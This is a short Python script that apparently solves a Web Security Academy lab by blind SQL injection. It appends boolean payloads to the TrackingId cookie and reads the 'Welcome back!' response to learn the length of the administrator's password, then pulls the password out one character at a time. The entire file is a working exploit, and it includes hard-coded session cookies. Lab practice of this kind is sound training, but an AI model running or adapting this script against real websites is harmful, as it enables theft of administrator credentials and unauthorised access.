import requests

url = 'https://0a340037039cbf6880b03ab2009000c5.web-security-academy.net/filter?category=Accessories'
characters = 'abcdefghijklmnopqrstuvwxyz1234567890'

# Function to find the length of the administrator's password
def get_length():
    for i in range(1, 31):
        cookie = {'TrackingId': 'sg5WpDSaV5vkIkMA', 'session': 'RPhoyHVIoay9o0rs02B6v1pIFk1F5koY'}
        # Construct the payload to check the length of the password
        payload = f"' AND LENGTH((SELECT password from users where username='administrator')) = {i}--"
        cookie['TrackingId'] += payload
        # Send the request with the modified cookie
        r = requests.get(url, cookies=cookie)
        # Check if the response indicates the correct length
        if 'Welcome back!' in r.text:
            return i

# Function to retrieve the administrator's password using the determined length
def get_data(length):
    temp = ""
    for i in range(1, length + 1):
        for char in characters:
            cookie = {'TrackingId': 'sg5WpDSaV5vkIkMA', 'session': 'RPhoyHVIoay9o0rs02B6v1pIFk1F5koY'}
            # Construct the payload to check the character at the current position
            payload = f"' AND SUBSTRING((SELECT password from users where username='administrator'), {i}, 1) = '{char}'--"
            cookie['TrackingId'] += payload
            # Send the request with the modified cookie
            r = requests.get(url, cookies=cookie)
            # Check if the response indicates the correct character
            if 'Welcome back!' in r.text:
                print('\r'+temp)
                temp += char
                break
    return temp

# Main logic
length = get_length()
print(f"Length of password is {length}")
print("Dumping DATA.. Please Wait.")
data = get_data(length)
print(f"Got it!: {data}")
